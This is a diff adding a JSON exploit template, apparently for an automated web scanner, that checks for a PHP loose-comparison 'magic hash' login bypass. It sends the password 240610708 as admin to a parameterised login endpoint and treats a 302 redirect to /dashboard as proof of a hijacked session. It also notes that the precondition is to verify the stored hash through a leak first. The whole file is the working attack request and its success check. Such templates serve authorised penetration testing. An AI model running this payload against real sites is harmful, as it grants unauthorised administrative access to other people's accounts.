@@ -1,0 +1,32 @@
+{
+  "name": "web/PHP type-juggling magic hash bypass",
+  "description": "[medium] Proves PHP loose-comparison auth bypass: password 240610708 (md5 = 0e462097431906509019562988736854, all-digit mantissa) ==-collides with any stored 0e-hash and lands a session. Keywords: php type juggling magic hash loose comparison bypass 0e auth. ctrl: non-magic password fails normally -> not falsified. base_url = login endpoint accepting pass param; PRECONDITION: stored hash is 0e-shaped (verify via leak first).",
+  "cwe": "CWE-288",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/login?user=admin&pass=240610708"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 302
+    },
+    {
+      "type": "header_regex",
+      "request": "payload",
+      "pattern": "(?i)location:\\s*/dashboard",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "b76411f0cbf2",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
